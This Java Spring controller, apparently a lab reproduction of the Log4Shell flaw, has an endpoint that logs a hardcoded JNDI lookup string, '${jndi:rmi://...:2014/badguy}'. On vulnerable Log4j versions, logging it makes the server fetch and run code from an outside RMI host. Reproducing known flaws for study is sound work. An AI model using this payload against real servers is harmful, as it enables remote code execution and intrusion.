package cc.fireflyhut.selftech.controller;

import cc.fireflyhut.selftech.dto.BugRequest;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.web.bind.annotation.*;

import java.io.IOException;


@RestController
public class BugTestController {

    public static final Logger logger = LogManager.getLogger();

    @PostMapping("/bug")
    public String testBug(@RequestBody BugRequest r) {
        String el = "${jndi:rmi://192.168.10.101:2014/badguy}";

        logger.info("执行漏洞:{}", el);


        return "xixixi";
    }



}
